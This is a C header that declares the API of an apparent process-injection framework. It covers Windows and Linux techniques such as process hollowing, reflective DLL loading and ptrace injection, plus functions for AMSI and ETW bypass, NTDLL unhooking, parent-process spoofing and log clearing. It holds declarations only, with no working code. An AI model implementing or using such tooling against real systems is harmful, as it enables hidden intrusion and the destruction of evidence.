/*
 * Process Injection Core Framework
 * Advanced implementation with multiple techniques
 */

#ifndef INJECT_CORE_H
#define INJECT_CORE_H

#include <stdint.h>
#include <stddef.h>
#include <stdbool.h>
#include "../core/config.h"

// Injection status codes
typedef enum {
    INJECT_SUCCESS = 0,
    INJECT_ERROR_GENERIC = -1,
    INJECT_ERROR_PROCESS_NOT_FOUND = -2,
    INJECT_ERROR_ACCESS_DENIED = -3,
    INJECT_ERROR_ALLOCATION_FAILED = -4,
    INJECT_ERROR_WRITE_FAILED = -5,
    INJECT_ERROR_EXECUTION_FAILED = -6,
    INJECT_ERROR_TECHNIQUE_UNSUPPORTED = -7,
    INJECT_ERROR_ARCHITECTURE_MISMATCH = -8,
    INJECT_ERROR_INVALID_PARAMS = -9,
    INJECT_ERROR_TIMEOUT = -10
} inject_status_t;

// Injection techniques
typedef enum {
    // Windows techniques
    INJECT_TECHNIQUE_CREATE_REMOTE_THREAD = 0x01,
    INJECT_TECHNIQUE_SET_WINDOWS_HOOK = 0x02,
    INJECT_TECHNIQUE_QUEUE_USER_APC = 0x03,
    INJECT_TECHNIQUE_SET_THREAD_CONTEXT = 0x04,
    INJECT_TECHNIQUE_PROCESS_HOLLOWING = 0x05,
    INJECT_TECHNIQUE_MANUAL_MAP = 0x06,
    INJECT_TECHNIQUE_REFLECTIVE_DLL = 0x07,
    INJECT_TECHNIQUE_ATOM_BOMBING = 0x08,
    INJECT_TECHNIQUE_THREAD_HIJACKING = 0x09,
    
    // Linux techniques
    INJECT_TECHNIQUE_PTRACE = 0x10,
    INJECT_TECHNIQUE_LD_PRELOAD = 0x11,
    INJECT_TECHNIQUE_PROC_MEM = 0x12,
    INJECT_TECHNIQUE_DLOPEN = 0x13,
    INJECT_TECHNIQUE_VDSO_HIJACK = 0x14,
    INJECT_TECHNIQUE_SO_INJECTION = 0x15,
    
    // Cross-platform
    INJECT_TECHNIQUE_AUTO = 0xFF  // Auto-select best technique
} inject_technique_t;

// Injection flags
typedef enum {
    INJECT_FLAG_NONE = 0x00,
    INJECT_FLAG_STEALTH = 0x01,        // Use stealth techniques
    INJECT_FLAG_PERSIST = 0x02,        // Make injection persistent
    INJECT_FLAG_CLEANUP = 0x04,        // Clean up traces after injection
    INJECT_FLAG_USE_SYSCALLS = 0x08,   // Use direct syscalls
    INJECT_FLAG_UNHOOK_NTDLL = 0x10,   // Unhook NTDLL first
    INJECT_FLAG_BYPASS_ETW = 0x20,     // Bypass ETW
    INJECT_FLAG_BYPASS_AMSI = 0x40,    // Bypass AMSI
    INJECT_FLAG_WAIT_COMPLETION = 0x80 // Wait for injection to complete
} inject_flags_t;

// Process information structure (injection specific)
typedef struct {
    uint32_t pid;
    uint32_t ppid;
    char name[256];
    char path[512];
    char user[256];
    uint32_t session_id;
    bool is_64bit;
    bool is_protected;
    bool is_suspended;
    bool is_system;
    uint32_t thread_count;
    uint32_t handle_count;
    uint64_t base_address;
    uint64_t entry_point;
} inject_process_info_t;

// Injection configuration
typedef struct {
    uint32_t target_pid;                // Target process ID
    char target_name[256];              // Target process name (optional)
    inject_technique_t technique;       // Injection technique to use
    uint8_t* payload;                   // Payload buffer
    size_t payload_size;                // Payload size
    uint32_t flags;                     // Injection flags
    uint32_t timeout_ms;                // Timeout in milliseconds
    void* technique_params;             // Technique-specific parameters
    
    // Callbacks (optional)
    void (*on_progress)(const char* msg);
    void (*on_error)(const char* error);
    void (*on_success)(void);
} inject_config_t;

// Technique-specific parameters
typedef struct {
    char dll_path[512];                // For DLL injection
    uint64_t entry_point;              // For thread hijacking
    char process_to_hollow[512];       // For process hollowing
} inject_params_dll_t;

typedef struct {
    uint8_t* pe_buffer;                // PE file buffer
    size_t pe_size;                    // PE file size
    char hollow_target[512];           // Process to hollow
    bool spoof_parent;                 // Spoof parent process
    uint32_t parent_pid;               // Parent PID to spoof
} inject_params_hollowing_t;

// Memory allocation strategies
typedef enum {
    ALLOC_STRATEGY_DEFAULT = 0,        // Default VirtualAllocEx
    ALLOC_STRATEGY_NEAR_IMAGE,         // Allocate near legitimate DLL
    ALLOC_STRATEGY_CODE_CAVE,          // Find existing code cave
    ALLOC_STRATEGY_EXTEND_SECTION,     // Extend existing section
    ALLOC_STRATEGY_HIJACK_ALLOCATION   // Hijack existing allocation
} alloc_strategy_t;

// Memory region information
typedef struct {
    uint64_t base_address;
    size_t region_size;
    uint32_t protection;
    uint32_t state;
    uint32_t type;
    char module_name[256];
    bool is_executable;
    bool is_writable;
    bool is_image;
} memory_region_t;

// Core injection functions
inject_status_t inject_init(void);
inject_status_t inject_cleanup(void);

// Process enumeration and analysis
inject_status_t inject_enum_processes(inject_process_info_t** processes, uint32_t* count);
inject_status_t inject_get_process_info(uint32_t pid, inject_process_info_t* info);
inject_status_t inject_analyze_process(uint32_t pid, int* injection_score);
inject_status_t inject_find_process_by_name(const char* name, uint32_t* pid);

// Memory operations
inject_status_t inject_enum_memory_regions(uint32_t pid, memory_region_t** regions, uint32_t* count);
inject_status_t inject_find_code_cave(uint32_t pid, size_t size, uint64_t* address);
inject_status_t inject_allocate_memory(uint32_t pid, size_t size, uint32_t protection, 
                                       alloc_strategy_t strategy, uint64_t* address);
inject_status_t inject_write_memory(uint32_t pid, uint64_t address, const uint8_t* data, size_t size);
inject_status_t inject_read_memory(uint32_t pid, uint64_t address, uint8_t* buffer, size_t size);
inject_status_t inject_protect_memory(uint32_t pid, uint64_t address, size_t size, uint32_t protection);

// Main injection function
inject_status_t inject_execute(inject_config_t* config);

// Technique-specific functions
inject_status_t inject_create_remote_thread(inject_config_t* config);
inject_status_t inject_set_windows_hook(inject_config_t* config);
inject_status_t inject_queue_user_apc(inject_config_t* config);
inject_status_t inject_process_hollowing(inject_config_t* config);
inject_status_t inject_manual_map(inject_config_t* config);
inject_status_t inject_reflective_dll(inject_config_t* config);
inject_status_t inject_ptrace(inject_config_t* config);
inject_status_t inject_proc_mem(inject_config_t* config);
inject_status_t inject_ld_preload(inject_config_t* config);

// Evasion functions
inject_status_t inject_unhook_ntdll(void);
inject_status_t inject_bypass_etw(void);
inject_status_t inject_bypass_amsi(void);
inject_status_t inject_enable_debug_privilege(void);
inject_status_t inject_spoof_parent_process(uint32_t parent_pid);

// Cleanup functions
inject_status_t inject_remove_traces(uint32_t pid);
inject_status_t inject_clear_logs(void);

// Utility functions
const char* inject_status_to_string(inject_status_t status);
const char* inject_technique_to_string(inject_technique_t technique);
bool inject_is_process_injectable(inject_process_info_t* info);
inject_technique_t inject_select_best_technique(inject_process_info_t* info);

// Direct syscall support (Windows)
#ifdef PLATFORM_WINDOWS
typedef struct {
    uint32_t syscall_number;
    void* syscall_address;
    uint8_t original_bytes[32];
} syscall_info_t;

inject_status_t inject_setup_syscalls(void);
inject_status_t inject_get_syscall_number(const char* function_name, uint32_t* number);
void* inject_create_syscall_stub(uint32_t syscall_number);
#endif

// Platform-specific includes
#ifdef PLATFORM_WINDOWS
    #include "inject_windows.h"
#elif defined(PLATFORM_LINUX)
    #include "inject_linux.h"
#endif

#endif // INJECT_CORE_H